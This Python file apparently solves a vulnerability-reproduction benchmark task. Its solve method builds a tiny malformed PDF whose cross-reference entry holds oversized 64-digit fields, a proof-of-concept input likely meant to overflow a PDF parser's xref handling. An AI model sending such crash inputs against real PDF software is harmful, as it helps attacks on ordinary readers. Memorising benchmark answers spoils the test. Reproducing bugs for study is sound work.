import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.7\n"
        xref_offset = len(header)

        zeros_f1 = b"0" * 64
        zeros_f2 = b"0" * 64

        xref = (
            b"xref\n"
            b"0 1\n"
            + zeros_f1 + b" " + zeros_f2 + b" n \n"
        )

        trailer = (
            b"trailer\n"
            b"<<>>\n"
            b"startxref\n"
            + str(xref_offset).encode("ascii") + b"\n"
            b"%%EOF\n"
        )

        return header + xref + trailer